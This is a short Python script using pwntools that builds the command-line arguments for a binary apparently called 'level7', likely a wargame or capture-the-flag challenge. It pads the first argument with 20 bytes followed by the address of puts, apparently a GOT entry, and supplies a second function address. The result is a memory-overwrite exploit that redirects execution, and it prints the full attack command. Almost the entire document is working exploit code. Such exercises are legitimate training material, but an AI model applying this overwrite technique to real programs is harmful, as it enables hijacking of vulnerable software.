from pwn import *
import sys

m_addr = p32(0x080484F4)
puts_addr = p32(0x08049928)

first_arg = b"a" * 20
first_arg += puts_addr
first_arg = f"`echo -ne '{repr(first_arg)[2:-1]}'`"

second_arg = f"`echo -ne '{repr(m_addr)[2:-1]}'`"

print(f"./level7 {first_arg} {second_arg}")

